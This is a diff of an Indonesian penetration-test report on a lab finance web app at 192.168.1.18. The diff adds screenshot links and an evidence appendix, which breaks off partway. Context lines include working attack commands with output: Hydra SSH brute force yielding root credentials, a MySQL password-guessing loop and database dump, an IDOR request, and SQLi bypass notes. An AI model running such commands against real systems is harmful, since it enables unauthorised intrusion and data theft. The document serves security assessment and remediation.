@@ -4,6 +4,8 @@
 
 Selesai dalam ~40 menit pengujian. Semua akses diperoleh dari port terbuka saja, tanpa kredensial awal. Versi 1.1 — diadaptasi terhadap 12 screenshot di `bukti-pentest/`: target dikoreksi ke `192.168.1.18`, setiap temuan diberi anotasi bukti, dan temuan tanpa screenshot ditandai **belum diverifikasi**.
 
+> **Bukti visual:** ke-12 screenshot tertanam di [Lampiran D](#lampiran-d--bukti-visual). Nama berkas yang disebut di dalam laporan — seperti `ping.png` atau `9.png` — semuanya bisa diklik dan mengarah ke gambar aslinya.
+
 ---
 
 ## 1. Ringkasan Eksekutif
@@ -39,7 +41,7 @@ Halaman `/login` dan `/login-noportal` menampilkan contoh akun yang benar-benar 
 
 **3. Login tidak pernah menolak percobaan berulang**
 
-Tidak ada batas percobaan login maupun pendaftaran. Brute force SSH dengan 24 kandidat berhasil menemukan root dalam **2 detik** (`10.png`, `11.png`). Pengujian 1.000 permintaan pendaftaran beruntun yang menghasilkan 946 akun berasal dari draf sebelumnya dan **belum diverifikasi** — tidak ada screenshot pendukung.
+Tidak ada batas percobaan login maupun pendaftaran. Brute force SSH dengan 24 kandidat berhasil menemukan root dalam **2 detik** ([`10.png`](bukti-pentest/10.png), [`11.png`](bukti-pentest/11.png)). Pengujian 1.000 permintaan pendaftaran beruntun yang menghasilkan 946 akun berasal dari draf sebelumnya dan **belum diverifikasi** — tidak ada screenshot pendukung.
 
 > Perbaikan: pasang rate limiting (misal 10 percobaan per 15 menit per IP) dan kunci akun sementara setelah 5 kegagalan.
 
@@ -53,18 +55,18 @@ Ketiga masalah di atas saling menguatkan. Memperbaiki satu saja **tidak** cukup 
 
 | Item | Nilai | Sumber |
 |---|---|---|
-| IP | 192.168.1.18 | `ping.png`, `scan-nmap.png` |
-| Status | Hidup, 0% packet loss, rtt rata-rata 3,97 ms | `ping.png` |
-| MAC | `08:00:27:81:9D:8D` | `scan-nmap.png` |
-| OS host | Alpine Linux 3.24.2, kernel 6.18.52-0-lts | `11.png` |
-| Aplikasi | Node.js Express framework (port 3000) | `scan-nmap.png` |
-| Basis data | MySQL 8.0.46, skema `labkeu`, **4 tabel** | `scan-nmap.png`, `9.png` |
-| Port terbuka | 22 (OpenSSH 10.3), 3000 (HTTP), 3307 (MySQL) | `scan-nmap.png` |
-| TLS/HTTPS | **Tidak ada sama sekali** | `scan-nmap.png` |
+| IP | 192.168.1.18 | [`ping.png`](bukti-pentest/ping.png), [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
+| Status | Hidup, 0% packet loss, rtt rata-rata 3,97 ms | [`ping.png`](bukti-pentest/ping.png) |
+| MAC | `08:00:27:81:9D:8D` | [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
+| OS host | Alpine Linux 3.24.2, kernel 6.18.52-0-lts | [`11.png`](bukti-pentest/11.png) |
+| Aplikasi | Node.js Express framework (port 3000) | [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
+| Basis data | MySQL 8.0.46, skema `labkeu`, **4 tabel** | [`scan-nmap.png`](bukti-pentest/scan-nmap.png), [`9.png`](bukti-pentest/9.png) |
+| Port terbuka | 22 (OpenSSH 10.3), 3000 (HTTP), 3307 (MySQL) | [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
+| TLS/HTTPS | **Tidak ada sama sekali** | [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
 
 Nomor versi Node.js (20.20.2) dan Express (4.19.2) berasal dari pembacaan source dan `package.json` **setelah** akses root diperoleh — bukan dari `nmap`. Perintah `nmap` yang direkam tidak memakai `-sC`, sehingga versi tidak dapat disimpulkan dari bukti.
 
-> **Dua container berjalan sebagai root, dan akun non-root `labkeu` punya akses ke `docker.sock` — yang setara root pada host. Klaim ini tidak memiliki screenshot.** `11.png` hanya memuat `id`, `uname -a`, dan `cat /etc/alpine-release`. Perlakukan sebagai temuan hipotesis sampai `docker ps` dan `id labkeu` direkam ulang.
+> **Dua container berjalan sebagai root, dan akun non-root `labkeu` punya akses ke `docker.sock` — yang setara root pada host. Klaim ini tidak memiliki screenshot.** [`11.png`](bukti-pentest/11.png) hanya memuat `id`, `uname -a`, dan `cat /etc/alpine-release`. Perlakukan sebagai temuan hipotesis sampai `docker ps` dan `id labkeu` direkam ulang.
 
 ---
 
@@ -99,7 +101,7 @@ Urutan di bawah mengikuti **stempel waktu asli pada screenshot**, bukan urutan n
 **Dua koreksi penting terhadap narasi lama:**
 
 1. **Brute force SSH terjadi lebih awal**, pada 00:42 — sebelum pengujian web mana pun (00:44–00:47). Draf sebelumnya menulis SQLi sebagai jalur terpendek menuju root; berdasarkan bukti, jalur terpendek yang benar-benar terekam justru SSH.
-2. **Dump kredensial dilakukan lewat MySQL langsung** (`9.png`), bukan lewat SQLi. Bukti SQLi (`7.png`) memang tidak menghasilkan output, sehingga klaim "satu request SQLi emptied the database" **tidak terbukti** di engagement ini. Yang terbukti: MySQL terbuka dengan kredensial lemah (F-15), lalu di-`SELECT` langsung.
+2. **Dump kredensial dilakukan lewat MySQL langsung** ([`9.png`](bukti-pentest/9.png)), bukan lewat SQLi. Bukti SQLi ([`7.png`](bukti-pentest/7.png)) memang tidak menghasilkan output, sehingga klaim "satu request SQLi emptied the database" **tidak terbukti** di engagement ini. Yang terbukti: MySQL terbuka dengan kredensial lemah (F-15), lalu di-`SELECT` langsung.
 
 ---
 
@@ -131,21 +133,21 @@ Kolom berikut memetakan setiap temuan ke screenshot yang benar-benar direkam. In
 
 | # | Temuan | Status bukti | Berkas | Catatan |
 |---|---|---|---|---|
-| F-01 | SQL Injection `/login-noportal` | **Sebagian** | `5.png` `6.png` `7.png` | `5.png` dan `7.png` hanya berisi perintah, tanpa output. `6.png` membuktikan HTTP=302 tetapi baris `Masuk sebagai: BlackHat` tidak tercetak. |
-| F-02 | Kredensial tercetak di halaman publik | **Belum diverifikasi** | `2.png` `3.png` | `3.png` membuktikan kredensial aktif (302), tetapi `2.png` yang harus menuntingkan teks `Contoh akun:` **tidak punya baris output**. |
-| F-03 | Self-registration peran perusahaan | **Tidak langsung** | `9.png` | Akun uji `zzz_unique_18950`, `zzz_csrf_31965` terlihat di dump DB. Tidak ada screenshot permintaan/respons. |
-| F-04 | IDOR lintas perusahaan | **Terbukti** | `4.png` | JSON `perusahaan_id:2` diambil dengan sesi `individu1` yang `perusahaan_id`-nya NULL. |
+| F-01 | SQL Injection `/login-noportal` | **Sebagian** | [`5.png`](bukti-pentest/5.png) [`6.png`](bukti-pentest/6.png) [`7.png`](bukti-pentest/7.png) | [`5.png`](bukti-pentest/5.png) dan [`7.png`](bukti-pentest/7.png) hanya berisi perintah, tanpa output. [`6.png`](bukti-pentest/6.png) membuktikan HTTP=302 tetapi baris `Masuk sebagai: BlackHat` tidak tercetak. |
+| F-02 | Kredensial tercetak di halaman publik | **Belum diverifikasi** | [`2.png`](bukti-pentest/2.png) [`3.png`](bukti-pentest/3.png) | [`3.png`](bukti-pentest/3.png) membuktikan kredensial aktif (302), tetapi [`2.png`](bukti-pentest/2.png) yang harus menuntingkan teks `Contoh akun:` **tidak punya baris output**. |
+| F-03 | Self-registration peran perusahaan | **Tidak langsung** | [`9.png`](bukti-pentest/9.png) | Akun uji `zzz_unique_18950`, `zzz_csrf_31965` terlihat di dump DB. Tidak ada screenshot permintaan/respons. |
+| F-04 | IDOR lintas perusahaan | **Terbukti** | [`4.png`](bukti-pentest/4.png) | JSON `perusahaan_id:2` diambil dengan sesi `individu1` yang `perusahaan_id`-nya NULL. |
 | F-05 | Upload file + stored XSS | **Belum diverifikasi** | — | Tidak ada screenshot. |
 | F-06 | Tidak ada rate limiting | **Belum diverifikasi** | — | Tidak ada screenshot. Klaim 946 akun tidak terbukti. |
 | F-07 | Session management lemah | **Belum diverifikasi** | — | Tidak ada screenshot. |
-| F-08 | Password plaintext | **Terbukti** | `9.png` | Kolom `password` berisi `password123` polos untuk semua baris. |
-| F-09 | Kredensial tanpa enkripsi | **Sebagian** | `scan-nmap.png` | Hanya 3 port, tanpa listener TLS. Bukti tcpdump tidak direkam. |
-| F-10 | Tidak ada proteksi CSRF | **Tidak langsung** | `9.png` | Hanya artefak akun `zzz_csrf_31965`. |
+| F-08 | Password plaintext | **Terbukti** | [`9.png`](bukti-pentest/9.png) | Kolom `password` berisi `password123` polos untuk semua baris. |
+| F-09 | Kredensial tanpa enkripsi | **Sebagian** | [`scan-nmap.png`](bukti-pentest/scan-nmap.png) | Hanya 3 port, tanpa listener TLS. Bukti tcpdump tidak direkam. |
+| F-10 | Tidak ada proteksi CSRF | **Tidak langsung** | [`9.png`](bukti-pentest/9.png) | Hanya artefak akun `zzz_csrf_31965`. |
 | F-11 | Reflected XSS `/search` | **Belum diverifikasi** | — | Tidak ada screenshot. |
 | F-12 | `/etc/passwd` publik | **Belum diverifikasi** | — | Tidak ada screenshot. |
 | F-13 | Tidak ada header keamanan | **Belum diverifikasi** | — | Tidak ada screenshot. |
 | F-14 | Username enumeration | **Belum diverifikasi** | — | Tidak ada screenshot. |
-| F-15 | Infrastruktur & konfigurasi | **Sebagian** | `8.png` `9.png` `10.png` `11.png` | MySQL terbuka dan SSH root terbukti. Klaim grup docker, container non-root, dan secret bocor **tidak** punya screenshot. |
+| F-15 | Infrastruktur & konfigurasi | **Sebagian** | [`8.png`](bukti-pentest/8.png) [`9.png`](bukti-pentest/9.png) [`10.png`](bukti-pentest/10.png) [`11.png`](bukti-pentest/11.png) | MySQL terbuka dan SSH root terbukti. Klaim grup docker, container non-root, dan secret bocor **tidak** punya screenshot. |
 
 **Ringkasan:** 2 temuan **terbukti**, 3 **sebagian**, 2 **tidak langsung**, dan **8 belum diverifikasi** — termasuk F-02 yang tercatat sebagai Critical. Klaim tersebut tetap layak dicatat sebagai temuan hipotesis, tetapi tidak boleh dianggap fakta sampai bukti diambil ulang. Perintah pengambilan ulang untuk setiap celah ada di `report/evidence.py` (`CHECKLIST`) dan dicetak sebagai Lampiran H di dokumen `.docx`.
 
@@ -153,20 +155,20 @@ Kolom berikut memetakan setiap temuan ke screenshot yang benar-benar direkam. In
 
 | Berkas | Waktu | Isi |
 |---|---|---|
-| `ping.png` | 00:08 | Host hidup, 0% packet loss, rtt rata-rata 3,97 ms |
-| `scan-nmap.png` | 00:10 | 22 OpenSSH 10.3 · 3000 Node.js Express · 3307 MySQL 8.0.46 · MAC `08:00:27:81:9D:8D` |
-| `2.png` | 00:44 | Perintah grep kredensial — **tanpa output** |
-| `3.png` | 00:44 | Login `individu1` → `HTTP=302 -> /dashboard` |
-| `4.png` | 00:44 | IDOR: 2 baris JSON `perusahaan_id:2` |
-| `5.png` | 00:44 | Perintah SQLi `ORDER BY 7` — **tanpa output** |
-| `6.png` | 00:45 | UNION auth bypass → `HTTP=302` |
-| `7.png` | 00:45 | Perintah dump kredensial — **tanpa output** |
-| `8.png` | 00:46 | Brute force MySQL → `labkeu_user / labkeu_pass` |
-| `9.png` | 00:47 | Dump DB: 4 tabel, `users` polos, `data_keuangan` |
-| `10.png` | 00:42 | Hydra → `root / Labkeu123`, 24 percobaan, 2 detik |
-| `11.png` | 00:47 | `uid=0(root)`, Alpine 3.24.2, kernel 6.18.52 |
+| [`ping.png`](bukti-pentest/ping.png) | 00:08 | Host hidup, 0% packet loss, rtt rata-rata 3,97 ms |
+| [`scan-nmap.png`](bukti-pentest/scan-nmap.png) | 00:10 | 22 OpenSSH 10.3 · 3000 Node.js Express · 3307 MySQL 8.0.46 · MAC `08:00:27:81:9D:8D` |
+| [`2.png`](bukti-pentest/2.png) | 00:44 | Perintah grep kredensial — **tanpa output** |
+| [`3.png`](bukti-pentest/3.png) | 00:44 | Login `individu1` → `HTTP=302 -> /dashboard` |
+| [`4.png`](bukti-pentest/4.png) | 00:44 | IDOR: 2 baris JSON `perusahaan_id:2` |
+| [`5.png`](bukti-pentest/5.png) | 00:44 | Perintah SQLi `ORDER BY 7` — **tanpa output** |
+| [`6.png`](bukti-pentest/6.png) | 00:45 | UNION auth bypass → `HTTP=302` |
+| [`7.png`](bukti-pentest/7.png) | 00:45 | Perintah dump kredensial — **tanpa output** |
+| [`8.png`](bukti-pentest/8.png) | 00:46 | Brute force MySQL → `labkeu_user / labkeu_pass` |
+| [`9.png`](bukti-pentest/9.png) | 00:47 | Dump DB: 4 tabel, `users` polos, `data_keuangan` |
+| [`10.png`](bukti-pentest/10.png) | 00:42 | Hydra → `root / Labkeu123`, 24 percobaan, 2 detik |
+| [`11.png`](bukti-pentest/11.png) | 00:47 | `uid=0(root)`, Alpine 3.24.2, kernel 6.18.52 |
 
-> **Catatan:** `10.png` bertimestamp 00:42, lebih awal dari `2.png`–`9.png` (00:44–00:47). Artinya dump database dilakukan **setelah** SSH root berhasil, bukan sebelum. Rantai serangan pada bagian 3 harus dibaca ulang dengan urutan ini.
+> **Catatan:** [`10.png`](bukti-pentest/10.png) bertimestamp 00:42, lebih awal dari [`2.png`](bukti-pentest/2.png)–[`9.png`](bukti-pentest/9.png) (00:44–00:47). Artinya dump database dilakukan **setelah** SSH root berhasil, bukan sebelum. Rantai serangan pada bagian 3 harus dibaca ulang dengan urutan ini.
 
 ---
 
@@ -178,9 +180,9 @@ Format tiap temuan: **Apa** → **Bukti** → **Dampak** → **Perbaikan**.
 
 ### F-01 · SQL Injection di `/login-noportal` — 9.8 Critical
 
-> **Status bukti: SEBAGIAN** — `5.png`, `6.png`, `7.png`
+> **Status bukti: SEBAGIAN** — [`5.png`](bukti-pentest/5.png), [`6.png`](bukti-pentest/6.png), [`7.png`](bukti-pentest/7.png)
 >
-> `5.png` dan `7.png` hanya berisi perintah tanpa output; `6.png` membuktikan HTTP=302 tetapi baris `Masuk sebagai: BlackHat` tidak tercetak. Isi kredensial terbukti ada via `9.png` (MySQL langsung), bukan via SQLi.
+> [`5.png`](bukti-pentest/5.png) dan [`7.png`](bukti-pentest/7.png) hanya berisi perintah tanpa output; [`6.png`](bukti-pentest/6.png) membuktikan HTTP=302 tetapi baris `Masuk sebagai: BlackHat` tidak tercetak. Isi kredensial terbukti ada via [`9.png`](bukti-pentest/9.png) (MySQL langsung), bukan via SQLi.
 
 **Apa.** Endpoint ini menyusun query SQL dengan menempelkan input pengguna secara langsung:
 
@@ -260,9 +262,9 @@ Tambahkan juga validasi format sebagai lapisan kedua, dan **jangan pernah** mena
 
 ### F-02 · Kredensial asli tercetak di halaman publik — 9.1 Critical
 
-> **Status bukti: BELUM DIVERIFIKASI** — `2.png`, `3.png`
+> **Status bukti: BELUM DIVERIFIKASI** — [`2.png`](bukti-pentest/2.png), [`3.png`](bukti-pentest/3.png)
 >
-> `3.png` membuktikan kredensial aktif (302 → /dashboard), tetapi `2.png` — yang harus menuntingkan teks `Contoh akun:` — **tidak memuat baris output**. Klaim kredensial tercetak di halaman publik belum terbukti.
+> [`3.png`](bukti-pentest/3.png) membuktikan kredensial aktif (302 → /dashboard), tetapi [`2.png`](bukti-pentest/2.png) — yang harus menuntingkan teks `Contoh akun:` — **tidak memuat baris output**. Klaim kredensial tercetak di halaman publik belum terbukti.
 
 **Apa.** Dua halaman login menyisipkan kredensial yang benar-benar aktif ke dalam HTML yang dilayani tanpa autentikasi:
 
@@ -298,9 +300,9 @@ benar   -> HTTP=302 -> /dashboard   (LOGIN BERHASIL)
 
 ### F-03 · Self-registration dengan peran perusahaan — 8.2 High
 
-> **Status bukti: TIDAK LANGSUNG** — `9.png`
+> **Status bukti: TIDAK LANGSUNG** — [`9.png`](bukti-pentest/9.png)
 >
-> Tidak ada screenshot permintaan/respons. Hanya artefak tak langsung: akun `zzz_unique_18950` dan `zzz_csrf_31965` di `9.png`.
+> Tidak ada screenshot permintaan/respons. Hanya artefak tak langsung: akun `zzz_unique_18950` dan `zzz_csrf_31965` di [`9.png`](bukti-pentest/9.png).
 
 **Apa.** Endpoint `/register` menerima field `account_type` langsung dari request dan menyimpannya tanpa pemeriksaan izin. Formulir publiknya bahkan menampilkan opsi "perusahaan" secara terbuka.
 
@@ -337,9 +339,9 @@ Di database: `account_type = perusahaan`, `perusahaan_id = NULL`.
 
 ### F-04 · IDOR — baca data keuangan perusahaan lain — 6.5 Medium (bisnis: High)
 
-> **Status bukti: TERBUKTI** — `4.png`
+> **Status bukti: TERBUKTI** — [`4.png`](bukti-pentest/4.png)
 >
-> `4.png` memperlihatkan respons JSON `perusahaan_id:2` diambil memakai sesi `individu1` yang `perusahaan_id`-nya NULL. Terbukti.
+> [`4.png`](bukti-pentest/4.png) memperlihatkan respons JSON `perusahaan_id:2` diambil memakai sesi `individu1` yang `perusahaan_id`-nya NULL. Terbukti.
 
 **Apa.** Endpoint API menerima ID perusahaan dari URL dan tidak pernah membandingkannya dengan ID perusahaan milik sesi yang sedang login.
 
@@ -583,9 +585,9 @@ Set-Cookie: connect.sid=s%3Alz3RUuYE...; Path=/
 
 ### F-08 · Password disimpan polos (plaintext) — 8.1 High
 
-> **Status bukti: TERBUKTI** — `9.png`
+> **Status bukti: TERBUKTI** — [`9.png`](bukti-pentest/9.png)
 >
-> `9.png` memperlihatkan kolom `password` berisi `password123` dan `Test12345!` dalam teks polos untuk seluruh baris. Terbukti.
+> [`9.png`](bukti-pentest/9.png) memperlihatkan kolom `password` berisi `password123` dan `Test12345!` dalam teks polos untuk seluruh baris. Terbukti.
 
 **Apa.** Password disimpan apa adanya di kolom VARCHAR, tanpa hashing, tanpa salt. Login membandingkan teks langsung: `WHERE username = ? AND password = ?`.
 
@@ -614,9 +616,9 @@ id  username    password
 
 ### F-09 · Kredensial dikirim tanpa enkripsi — 8.1 High
 
-> **Status bukti: SEBAGIAN** — `scan-nmap.png`
+> **Status bukti: SEBAGIAN** — [`scan-nmap.png`](bukti-pentest/scan-nmap.png)
 >
-> `scan-nmap.png` membuktikan hanya 3 port terbuka tanpa listener TLS. Bukti kredensial terbaca di kabel (tcpdump) tidak direkam.
+> [`scan-nmap.png`](bukti-pentest/scan-nmap.png) membuktikan hanya 3 port terbuka tanpa listener TLS. Bukti kredensial terbaca di kabel (tcpdump) tidak direkam.
 
 **Apa.** Aplikasi hanya tersedia lewat HTTP tanpa TLS. Tidak ada HTTPS, tidak ada HSTS, tidak ada proxy. Password dan cookie sesi melintas dalam bentuk teks terbuka.
 
@@ -643,9 +645,9 @@ Password terbaca di kabel:
 
 ### F-10 · Tidak ada proteksi CSRF — 7.1 High
 
-> **Status bukti: TIDAK LANGSUNG** — `9.png`
+> **Status bukti: TIDAK LANGSUNG** — [`9.png`](bukti-pentest/9.png)
 >
-> Tidak ada screenshot respons 200 untuk POST lintas-origin. Hanya artefak akun `zzz_csrf_31965` di `9.png`.
+> Tidak ada screenshot respons 200 untuk POST lintas-origin. Hanya artefak akun `zzz_csrf_31965` di [`9.png`](bukti-pentest/9.png).
 
 **Apa.** Tidak ada token CSRF, tidak ada validasi Origin/Referer, pada seluruh endpoint yang mengubah data (`/tambah-data`, `/edit-data/:id`, `/upload`, `/register`, `/logout`).
 
@@ -813,9 +815,9 @@ Pesannya juga membocorkan nama tabel (`users`), kolom (`username`), dan nama uni
 
 ### F-15 · Temuan infrastruktur — 9.8 Critical (komposit)
 
-> **Status bukti: SEBAGIAN** — `8.png`, `9.png`, `10.png`, `11.png`
+> **Status bukti: SEBAGIAN** — [`8.png`](bukti-pentest/8.png), [`9.png`](bukti-pentest/9.png), [`10.png`](bukti-pentest/10.png), [`11.png`](bukti-pentest/11.png)
 >
-> MySQL terbuka (`8.png`, `9.png`) dan SSH root (`10.png`, `11.png`) terbukti. Klaim grup docker, container berjalan sebagai root, dan secret bocor di artefak deployment **tidak** punya screenshot — `11.png` hanya memuat `id`, `uname -a`, `cat /etc/alpine-release`.
+> MySQL terbuka ([`8.png`](bukti-pentest/8.png), [`9.png`](bukti-pentest/9.png)) dan SSH root ([`10.png`](bukti-pentest/10.png), [`11.png`](bukti-pentest/11.png)) terbukti. Klaim grup docker, container berjalan sebagai root, dan secret bocor di artefak deployment **tidak** punya screenshot — [`11.png`](bukti-pentest/11.png) hanya memuat `id`, `uname -a`, `cat /etc/alpine-release`.
 
 **Apa.** Lima kelainan konfigurasi yang saling menguatkan.
 
@@ -867,11 +869,11 @@ Bagian ini penting untuk mencegah klaim berlebihan. Berikut pengujian yang **sud
 
 Enam koreksi faktual yang memisahkan laporan ini dari laporan lama:
 
-Koreksi pertama adalah yang paling material: draf sebelumnya mengalamatkan target di `192.168.1.93` dan menyatakan `192.168.1.18` sudah mati. Tidak satu pun bukti mendukung itu. Sebaliknya, `ping.png` menunjukkan `192.168.1.18` menjawab 4 dari 4 paket, dan kedua belas bukti pada engagement ini diambil di alamat tersebut. Seluruh dokumen karena itu dialamatkan ke `192.168.1.18`.
+Koreksi pertama adalah yang paling material: draf sebelumnya mengalamatkan target di `192.168.1.93` dan menyatakan `192.168.1.18` sudah mati. Tidak satu pun bukti mendukung itu. Sebaliknya, [`ping.png`](bukti-pentest/ping.png) menunjukkan `192.168.1.18` menjawab 4 dari 4 paket, dan kedua belas bukti pada engagement ini diambil di alamat tersebut. Seluruh dokumen karena itu dialamatkan ke `192.168.1.18`.
 
 | # | Klaim lama | Kenyataan | Tindakan |
 |---|---|---|---|
-| 1 | Target `192.168.1.93` dengan alasan `192.168.1.18` sudah mati | **Tidak didukung bukti apa pun.** `ping.png` justru membuktikan `192.168.1.18` hidup (0% packet loss), dan seluruh 12 bukti diambil di `192.168.1.18` | Target dikoreksi ke `192.168.1.18`; setiap temuan dianotasi ke berkas buktinya |
+| 1 | Target `192.168.1.93` dengan alasan `192.168.1.18` sudah mati | **Tidak didukung bukti apa pun.** [`ping.png`](bukti-pentest/ping.png) justru membuktikan `192.168.1.18` hidup (0% packet loss), dan seluruh 12 bukti diambil di `192.168.1.18` | Target dikoreksi ke `192.168.1.18`; setiap temuan dianotasi ke berkas buktinya |
 | 2 | Bukti listener pakai `ss -ltn` | `ss` tidak ada di host Alpine (`sh: ss: not found`) — evidence tidak reproducible | Diganti `netstat -ltnp` |
 | 3 | Respons IDOR kosong = 22 byte | Sebenarnya `[]` = **2 byte**. Heuristik lama salah | Diganti hitung kemunculan field `perusahaan_id` |
 | 4 | "Pembersihan jejak" selesai | **False.** 4 akun uji & 22 baris dokumen masih ada, `/uploads/passwd` live & publik | Dilaporkan sebagai F-12 |
@@ -944,12 +946,12 @@ Tidak ada data produksi tersentuh, tidak ada denial-of-service disengaja, tidak 
 Perintah di bawah adalah yang benar-benar direkam di `bukti-pentest/`. Nama berkas pada komentar menunjukkan bukti pendukungnya.
 
 ```bash
-# 1. Keterjangkauan host                                          [ping.png]
+# 1. Keterjangkauan host                                          [ping.png](bukti-pentest/ping.png)
 ping -c 4 192.168.1.18
 #   -> 4 packets transmitted, 4 received, 0% packet loss
 #   -> rtt min/avg/max/mdev = 1.115/3.966/10.472/3.781 ms
 
-# 2. Port & versi                                                 [scan-nmap.png]
+# 2. Port & versi                                                 [scan-nmap.png](bukti-pentest/scan-nmap.png)
 nmap -Pn -sV -p 22,3000,3307 192.168.1.18
 #   -> 22/tcp   open  ssh     OpenSSH 10.3 (protocol 2.0)
 #   -> 3000/tcp open  http    Node.js Express framework
@@ -960,13 +962,13 @@ nmap -Pn -sV -p 22,3000,3307 192.168.1.18
 # 3. Kredensial pada halaman publik            [2.png - TANPA OUTPUT, belum terbukti]
 curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'
 
-# 4. Login foothold                                                 [3.png]
+# 4. Login foothold                                                 [3.png](bukti-pentest/3.png)
 curl -s -c /tmp/c -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" \
   -X POST http://192.168.1.18:3000/login \
   -d "username=individu1&password=password123"
 #   -> HTTP=302 -> http://192.168.1.18:3000/dashboard
 
-# 5. IDOR: baca data perusahaan lain                                  [4.png]
+# 5. IDOR: baca data perusahaan lain                                  [4.png](bukti-pentest/4.png)
 curl -s -b /tmp/c http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
 #   -> 2 baris JSON dengan "perusahaan_id":2, atas sesi yang perusahaan_id-nya NULL
 
@@ -994,7 +996,7 @@ curl -s -c /tmp/d -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \
 curl -s -b /tmp/d http://192.168.1.18:3000/dashboard \
   | grep -oE 'Masuk sebagai: <strong>[^<]*</strong>'
 
-# 9. Brute force MySQL 3307                                          [8.png]
+# 9. Brute force MySQL 3307                                          [8.png](bukti-pentest/8.png)
 for u in root labkeu_user labkeu admin; do
   for p in "" root rootpass labkeu_pass password123 labkeu123; do
     [ -z "$p" ] && A="" || A="-p$p"
@@ -1004,13 +1006,13 @@ for u in root labkeu_user labkeu admin; do
 done
 #   -> TEMUKAN: labkeu_user / labkeu_pass
 
-# 10. Dump database                                                 [9.png]
+# 10. Dump database                                                 [9.png](bukti-pentest/9.png)
 mysql -h 192.168.1.18 -P 3307 -u labkeu_user -plabkeu_pass --skip-ssl labkeu \
   -e "SHOW TABLES; SELECT * FROM users; SELECT * FROM data_keuangan;"
 #   -> 4 tabel: data_keuangan, dokumen, perusahaan, users
 #   -> kolom password berisi password123 / Test12345! dalam teks polos
 
-# 11. Brute force SSH (Hydra)                                       [10.png]
+# 11. Brute force SSH (Hydra)                                       [10.png](bukti-pentest/10.png)
 printf 'root\nlabkeu\nadmin\nubuntu\n' > /tmp/u.txt
 printf 'Labkeu\nlabkeu123\npassword\npassword123\nroot123\ntoor\n' > /tmp/p.txt
 hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
@@ -1018,7 +1020,7 @@ hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
 #   -> [22][ssh] host: 192.168.1.18 login: root password: Labkeu123
 #   -> 1 valid password found, 00:42:52 -> 00:42:54 (2 detik)
 
-# 12. Konfirmasi root                                              [11.png]
+# 12. Konfirmasi root                                              [11.png](bukti-pentest/11.png)
 sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \
   "id; uname -a; cat /etc/alpine-release"
 #   -> uid=0(root) gid=0(root)
@@ -1070,3 +1072,223 @@ mysql -h 192.168.1.18 -P 3307 -u root -prootpass --skip-ssl -e "SELECT 1"
 ---
 
 **Skor CVSS dihitung dengan rumus resmi FIRST v3.1, bukan estimasi manual.** Karena itu beberapa skor berbeda dari tabel yang beredar luas: F-03 = **8.2** (bukan 8.1), F-09 = **8.1**, F-10 = **7.1** (bukan 6.3). Aritmetika lengkap per temuan tersedia di Lampiran A dokumen `.docx`.
+
+---
+
+## Lampiran D — Bukti Visual
+
+Dua belas screenshot asli dari pengujian, tersimpan di `bukti-pentest/`. Nomor di kiri adalah jam penangkapan (WIB). Yang bertanda **belum terbukti** memang direkam tanpa output — sengaja dibiarkan apa adanya, bukan dihapus, supaya klaim yang tidak terbukti bisa dinilai sendiri oleh pembaca.
+
+### [`ping.png`](bukti-pentest/ping.png) — Keterjangkauan host
+
+**Jam 00:08 WIB.**
+
+![Keterjangkauan host — ping.png](bukti-pentest/ping.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+64 bytes from 192.168.1.18: icmp_seq=1 ttl=64 time=10.5 ms
+64 bytes from 192.168.1.18: icmp_seq=2 ttl=64 time=2.32 ms
+64 bytes from 192.168.1.18: icmp_seq=3 ttl=64 time=1.95 ms
+64 bytes from 192.168.1.18: icmp_seq=4 ttl=64 time=1.12 ms
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 1.115/3.966/10.472/3.781 ms
+```
+
+</details>
+
+### [`scan-nmap.png`](bukti-pentest/scan-nmap.png) — Port dan versi layanan
+
+**Jam 00:10 WIB.**
+
+![Port dan versi layanan — scan-nmap.png](bukti-pentest/scan-nmap.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+22/tcp    open  ssh     OpenSSH 10.3 (protocol 2.0)
+3000/tcp  open  http    Node.js Express framework
+3307/tcp  open  mysql   MySQL 8.0.46
+MAC Address: 08:00:27:81:9D:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+</details>
+
+### [`2.png`](bukti-pentest/2.png) — Kredensial pada halaman publik
+
+**Jam 00:44 WIB.**
+
+![Kredensial pada halaman publik — 2.png](bukti-pentest/2.png)
+
+> **Belum terbukti.** Tidak ada output tercetak — belum terbukti.
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s http://192.168.1.18:3000/login | grep -oE 'Contoh akun:.*'
+— TIDAK ADA OUTPUT TERCETAK —
+```
+
+</details>
+
+### [`3.png`](bukti-pentest/3.png) — Login foothold
+
+**Jam 00:44 WIB.**
+
+![Login foothold — 3.png](bukti-pentest/3.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -c /tmp/c ... -X POST http://192.168.1.18:3000/login -d username=individu1&password=REDACTED_STORED_PASSWORD
+HTTP=302 -> http://192.168.1.18:3000/dashboard
+```
+
+</details>
+
+### [`4.png`](bukti-pentest/4.png) — IDOR data keuangan lintas perusahaan
+
+**Jam 00:44 WIB.**
+
+![IDOR data keuangan lintas perusahaan — 4.png](bukti-pentest/4.png)
+
+<details><summary>Isi yang direkam</summary>
+
+```
+$ curl -s -b /tmp/c http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
+[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},
+ {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]
+```
+
+</details>
+
+### [`5.png`](bukti-pentest/5.png) — SQLi - penentuan jumlah kolom
+
+**Jam 00:44 WIB.**
+
